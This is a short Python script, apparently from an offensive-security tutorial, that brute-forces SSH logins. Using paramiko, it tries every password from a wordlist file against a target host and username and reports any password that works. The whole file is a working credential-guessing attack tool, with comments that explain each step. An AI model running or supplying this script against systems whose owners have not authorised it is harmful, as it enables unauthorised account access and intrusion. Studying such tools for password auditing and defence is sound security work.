# The Paramiko Lib is going to be used to automate the process
# Of connecting to our SSH client, as it has all the necessary
# Pre-made functions needed to make the process shorter
# To install Paramiko use - pip3 install paramiko
# Read More on Paramiko (http://docs.paramiko.org/en/stable/)
import paramiko
import sys
import os
import socket
# Term color is used to print statements in diff colors
# To install Term color use - pip3 install termcolor
# Read More on Term color (https://pypi.org/project/termcolor/)
import termcolor

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # connect function from paramiko takes in 4 parameters to initiate
        # connection (IP address/Host, Port, Username, and Password)
        ssh.connect(host, port=22, username=username, password=password)
    # The paramiko.AuthenticationException is returned when the login credentials
    # Are invalid or not authenticated
    except paramiko.AuthenticationException:
        # If successful connection code will remain code=0
        # Else failed connection, code=1
        code = 1
    except socket.error as e:
        # Else connection error(etc host offline), code=2
        code = 2
    # Paramiko close() function closes the connections
    ssh.close()
    return code

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Password File: ')
print('\n')

if not os.path.exists(input_file):
    print('[!!] That file/path does not exist')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                # using termcolor.colored(First bracket is for data to change color), second for color to use)
                print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
                break
            elif response == 1:
                print(termcolor.colored(('[-] Incorrect Credentials: ' + password), 'red'))
            elif response == 2:
                print(termcolor.colored(('[-] Connection Error: ' + password), 'yellow'))
                sys.exit(1)
        except Exception as e:
            print(e)
            pass